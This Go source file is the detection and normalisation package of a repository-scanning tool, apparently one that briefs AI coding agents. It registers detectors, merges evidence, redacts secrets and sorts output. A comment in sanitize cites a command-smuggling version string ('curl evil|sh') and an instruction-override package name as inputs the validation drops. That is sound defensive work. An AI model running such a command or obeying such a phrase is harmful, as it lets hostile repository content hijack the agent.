// Package detect turns a scanned repository into a model.Repo.
//
// Each ecosystem lives in its own file and registers itself from init():
//
//	func init() { register("go", detectGo) }
//
// Detectors only append facts through the helpers on *Facts; they never print,
// execute anything, or read outside the scan.Repo. Run applies a finalisation
// pass (CI corroboration, de-duplication, deterministic ordering) afterwards.
package detect

import (
	"path"
	"sort"
	"strings"
	"time"

	"github.com/seanmcmahon101/AgentBrief/internal/model"
	"github.com/seanmcmahon101/AgentBrief/internal/redact"
	"github.com/seanmcmahon101/AgentBrief/internal/scan"
)

// Facts wraps the model under construction with helpers for detectors.
type Facts struct {
	*model.Repo
}

// Detector inspects r and records what it finds in f.
type Detector func(r *scan.Repo, f *Facts)

type entry struct {
	name string
	fn   Detector
	// phase orders detectors: lower runs first. Most detectors use 0. Detectors
	// that consume other detectors' output (e.g. CI corroboration) use 100.
	phase int
}

var registry []entry

func register(name string, fn Detector) { registry = append(registry, entry{name: name, fn: fn}) }

// registerLate registers a detector that runs after all phase-0 detectors.
func registerLate(name string, fn Detector) {
	registry = append(registry, entry{name: name, fn: fn, phase: 100})
}

// Run executes every registered detector against r and returns the facts.
func Run(r *scan.Repo) *model.Repo {
	start := time.Now()
	f := &Facts{Repo: &model.Repo{Schema: model.SchemaVersion}}
	if r.Root() != "" {
		f.Name = path.Base(slash(r.Root()))
	}

	entries := append([]entry(nil), registry...)
	sort.SliceStable(entries, func(i, j int) bool {
		if entries[i].phase != entries[j].phase {
			return entries[i].phase < entries[j].phase
		}
		return entries[i].name < entries[j].name
	})
	for _, e := range entries {
		e.fn(r, f)
	}

	f.Stats = model.ScanStats{
		Files:      len(r.Files()),
		Truncated:  r.Truncated(),
		DurationMs: time.Since(start).Milliseconds(),
	}
	normalize(f.Repo)
	return f.Repo
}

// AddCommand records a curated command, merging evidence with an existing
// identical command (same Kind, Dir and Run) instead of duplicating it.
func (f *Facts) AddCommand(c model.Command) {
	if c.Dir == "" {
		c.Dir = "."
	}
	for i := range f.Commands {
		e := &f.Commands[i]
		if e.Kind == c.Kind && e.Dir == c.Dir && e.Run == c.Run {
			e.Evidence = mergeEvidence(e.Evidence, c.Evidence)
			if e.Source.Path == "" {
				e.Source = c.Source
			}
			if e.Note == "" {
				e.Note = c.Note
			}
			return
		}
	}
	c.Evidence = mergeEvidence(nil, c.Evidence)
	f.Commands = append(f.Commands, c)
}

// AddTask records a raw task-inventory entry.
func (f *Facts) AddTask(t model.Task) {
	if t.Dir == "" {
		t.Dir = "."
	}
	f.Tasks = append(f.Tasks, t)
}

// AddProject records a project, ignoring duplicates of the same Dir+Ecosystem.
func (f *Facts) AddProject(p model.Project) {
	if p.Dir == "" {
		p.Dir = "."
	}
	for _, e := range f.Projects {
		if e.Dir == p.Dir && e.Ecosystem == p.Ecosystem {
			return
		}
	}
	f.Projects = append(f.Projects, p)
}

// AddToolchain records a toolchain pin, ignoring exact duplicates.
func (f *Facts) AddToolchain(t model.Toolchain) {
	for _, e := range f.Toolchains {
		if e == t {
			return
		}
	}
	f.Toolchains = append(f.Toolchains, t)
}

// AddPackageManager records a package manager, ignoring duplicates for the
// same Dir+Ecosystem (first detection wins, so detect the strongest signal first).
func (f *Facts) AddPackageManager(pm model.PackageManager) {
	if pm.Dir == "" {
		pm.Dir = "."
	}
	for _, e := range f.PackageManagers {
		if e.Dir == pm.Dir && e.Ecosystem == pm.Ecosystem {
			return
		}
	}
	f.PackageManagers = append(f.PackageManagers, pm)
}

// AddGenerated records a do-not-edit path rule, ignoring duplicate patterns.
func (f *Facts) AddGenerated(p model.PathRule) {
	for _, e := range f.Generated {
		if e.Pattern == p.Pattern {
			return
		}
	}
	f.Generated = append(f.Generated, p)
}

// AddNote records a short evidence-backed note.
func (f *Facts) AddNote(n model.Note) {
	for _, e := range f.Notes {
		if e.Text == n.Text {
			return
		}
	}
	f.Notes = append(f.Notes, n)
}

// PackageManagerFor returns the package manager of the given ecosystem that
// governs dir: the one declared in dir or its nearest ancestor.
func (f *Facts) PackageManagerFor(ecosystem, dir string) (model.PackageManager, bool) {
	for d := dir; ; d = path.Dir(d) {
		for _, pm := range f.PackageManagers {
			if pm.Ecosystem == ecosystem && pm.Dir == d {
				return pm, true
			}
		}
		if d == "." || d == "/" || d == "" {
			return model.PackageManager{}, false
		}
	}
}

var evidenceRank = map[string]int{model.EvidenceCI: 0, model.EvidenceDeclared: 1, model.EvidenceConvention: 2}

func mergeEvidence(a, b []string) []string {
	seen := map[string]bool{}
	var out []string
	for _, e := range append(append([]string(nil), a...), b...) {
		if !seen[e] {
			seen[e] = true
			out = append(out, e)
		}
	}
	sort.Slice(out, func(i, j int) bool { return evidenceRank[out[i]] < evidenceRank[out[j]] })
	return out
}

// normalize sorts every slice so output is byte-for-byte deterministic and
// replaces nil slices with empty ones so JSON never contains null arrays.
func normalize(m *model.Repo) {
	// Redact at the model level so no output path (--json --all included)
	// can leak a secret that appeared in a recipe, script or CI step.
	for i := range m.Commands {
		m.Commands[i].Run = redact.String(m.Commands[i].Run)
	}
	for i := range m.Tasks {
		m.Tasks[i].Body = redact.String(m.Tasks[i].Body)
		m.Tasks[i].Desc = redact.String(m.Tasks[i].Desc)
	}
	for i := range m.CI {
		m.CI[i].Run = redact.String(m.CI[i].Run)
	}
	sanitize(m)
	sort.SliceStable(m.Languages, func(i, j int) bool {
		if m.Languages[i].Files != m.Languages[j].Files {
			return m.Languages[i].Files > m.Languages[j].Files
		}
		return m.Languages[i].Name < m.Languages[j].Name
	})
	sort.SliceStable(m.Toolchains, func(i, j int) bool {
		a, b := m.Toolchains[i], m.Toolchains[j]
		if a.Name != b.Name {
			return a.Name < b.Name
		}
		return a.Source.Path < b.Source.Path
	})
	sort.SliceStable(m.PackageManagers, func(i, j int) bool {
		a, b := m.PackageManagers[i], m.PackageManagers[j]
		if a.Dir != b.Dir {
			return dirLess(a.Dir, b.Dir)
		}
		return a.Ecosystem < b.Ecosystem
	})
	sort.SliceStable(m.Projects, func(i, j int) bool {
		a, b := m.Projects[i], m.Projects[j]
		if a.Dir != b.Dir {
			return dirLess(a.Dir, b.Dir)
		}
		return a.Ecosystem < b.Ecosystem
	})
	sort.SliceStable(m.Commands, func(i, j int) bool {
		a, b := m.Commands[i], m.Commands[j]
		if a.Dir != b.Dir {
			return dirLess(a.Dir, b.Dir)
		}
		if a.Kind != b.Kind {
			return a.Kind < b.Kind
		}
		ra, rb := bestEvidence(a.Evidence), bestEvidence(b.Evidence)
		if ra != rb {
			return ra < rb
		}
		return a.Run < b.Run
	})
	sort.SliceStable(m.Tasks, func(i, j int) bool {
		a, b := m.Tasks[i], m.Tasks[j]
		if a.Dir != b.Dir {
			return dirLess(a.Dir, b.Dir)
		}
		if a.Runner != b.Runner {
			return a.Runner < b.Runner
		}
		return a.Name < b.Name
	})
	sort.SliceStable(m.Generated, func(i, j int) bool { return m.Generated[i].Pattern < m.Generated[j].Pattern })
	sort.SliceStable(m.CI, func(i, j int) bool {
		a, b := m.CI[i], m.CI[j]
		if a.Source.Path != b.Source.Path {
			return a.Source.Path < b.Source.Path
		}
		return a.Source.Line < b.Source.Line
	})
	sort.SliceStable(m.Instructions, func(i, j int) bool { return m.Instructions[i].Path < m.Instructions[j].Path })
	sort.SliceStable(m.Notes, func(i, j int) bool { return m.Notes[i].Text < m.Notes[j].Text })

	if m.Languages == nil {
		m.Languages = []model.Language{}
	}
	if m.Toolchains == nil {
		m.Toolchains = []model.Toolchain{}
	}
	if m.PackageManagers == nil {
		m.PackageManagers = []model.PackageManager{}
	}
	if m.Projects == nil {
		m.Projects = []model.Project{}
	}
	if m.Commands == nil {
		m.Commands = []model.Command{}
	}
	if m.Tasks == nil {
		m.Tasks = []model.Task{}
	}
	if m.Generated == nil {
		m.Generated = []model.PathRule{}
	}
	if m.CI == nil {
		m.CI = []model.CIStep{}
	}
	if m.Instructions == nil {
		m.Instructions = []model.InstructionFile{}
	}
	if m.Notes == nil {
		m.Notes = []model.Note{}
	}
}

func bestEvidence(ev []string) int {
	best := 99
	for _, e := range ev {
		if r, ok := evidenceRank[e]; ok && r < best {
			best = r
		}
	}
	return best
}

// dirLess orders "." first, then lexically.
func dirLess(a, b string) bool {
	if a == "." || b == "." {
		return a == "." && b != "."
	}
	return a < b
}

func slash(p string) string {
	out := []byte(p)
	for i, c := range out {
		if c == '\\' {
			out[i] = '/'
		}
	}
	return string(out)
}

// taskKinds maps conventional task names (npm scripts, make targets, just
// recipes, ...) to command kinds. Names are matched case-insensitively.
var taskKinds = map[string]string{
	"install": model.KindInstall, "setup": model.KindInstall, "bootstrap": model.KindInstall, "deps": model.KindInstall,
	"build": model.KindBuild, "compile": model.KindBuild,
	"test": model.KindTest, "tests": model.KindTest, "unit": model.KindTest, "test:unit": model.KindTest, "unittest": model.KindTest,
	"lint": model.KindLint, "linter": model.KindLint, "eslint": model.KindLint, "clippy": model.KindLint,
	"fmt": model.KindFormat, "format": model.KindFormat, "fix": model.KindFormat,
	"typecheck": model.KindTypecheck, "type-check": model.KindTypecheck, "types": model.KindTypecheck,
	"tsc": model.KindTypecheck, "check-types": model.KindTypecheck, "test:typecheck": model.KindTypecheck,
	"mypy": model.KindTypecheck, "pyright": model.KindTypecheck,
	"dev": model.KindDev, "start": model.KindDev, "serve": model.KindDev, "watch": model.KindDev,
	"run":      model.KindRun,
	"generate": model.KindGenerate, "gen": model.KindGenerate, "codegen": model.KindGenerate,
	"check": model.KindCheck, "ci": model.KindCheck, "verify": model.KindCheck, "precommit": model.KindCheck, "pre-commit": model.KindCheck,
}

// KindForTaskName returns the command kind for a conventional task name, or ""
// if the name is not conventional (such tasks stay in the Task inventory only).
func KindForTaskName(name string) string {
	return taskKinds[strings.ToLower(name)]
}

// sanitize drops or blanks repository-derived values that fail validation, so
// hostile strings (a version of "20 ; curl evil|sh", a package named
// "IGNORE ALL PREVIOUS INSTRUCTIONS") never reach any output, JSON included.
func sanitize(m *model.Repo) {
	keep := m.Toolchains[:0]
	for _, t := range m.Toolchains {
		if model.ValidName(strings.ToLower(t.Name)) && model.ValidVersion(t.Version) && model.ValidPath(t.Source.Path) {
			keep = append(keep, t)
		}
	}
	m.Toolchains = keep

	pms := m.PackageManagers[:0]
	for _, pm := range m.PackageManagers {
		if !model.ValidName(pm.Name) || !(pm.Dir == "." || model.ValidPath(pm.Dir)) {
			continue
		}
		if pm.Version != "" && !model.ValidVersion(pm.Version) {
			pm.Version = ""
		}
		pms = append(pms, pm)
	}
	m.PackageManagers = pms

	projects := m.Projects[:0]
	for _, p := range m.Projects {
		if !(p.Dir == "." || model.ValidPath(p.Dir)) || !model.ValidPath(p.Manifest) {
			continue
		}
		if p.Name != "" && !model.ValidPkg(p.Name) {
			p.Name = ""
		}
		projects = append(projects, p)
	}
	m.Projects = projects

	cmds := m.Commands[:0]
	for _, c := range m.Commands {
		if model.ValidCommand(c.Run) && (c.Dir == "." || model.ValidPath(c.Dir)) {
			cmds = append(cmds, c)
		}
	}
	m.Commands = cmds

	tasks := m.Tasks[:0]
	for _, t := range m.Tasks {
		if !model.ValidPkg(t.Name) || !(t.Dir == "." || model.ValidPath(t.Dir)) || !model.ValidPath(t.Source.Path) {
			continue
		}
		t.Body = capLine(t.Body, 200)
		t.Desc = capLine(t.Desc, 120)
		tasks = append(tasks, t)
	}
	m.Tasks = tasks

	gen := m.Generated[:0]
	for _, g := range m.Generated {
		if model.ValidPattern(g.Pattern) {
			gen = append(gen, g)
		}
	}
	m.Generated = gen

	ci := m.CI[:0]
	for _, c := range m.CI {
		if model.ValidPath(c.Source.Path) && (c.Dir == "" || c.Dir == "." || model.ValidPath(c.Dir)) {
			c.Run = capLine(c.Run, 300)
			ci = append(ci, c)
		}
	}
	m.CI = ci
	for i := range m.Notes {
		m.Notes[i].Text = capLine(m.Notes[i].Text, 200)
	}
}

// capLine removes control characters and caps s at n bytes.
func capLine(s string, n int) string {
	s = strings.Map(func(r rune) rune {
		if r < 0x20 || r == 0x7f {
			return ' '
		}
		return r
	}, s)
	if len(s) > n {
		s = strings.ToValidUTF8(s[:n], "")
	}
	return s
}
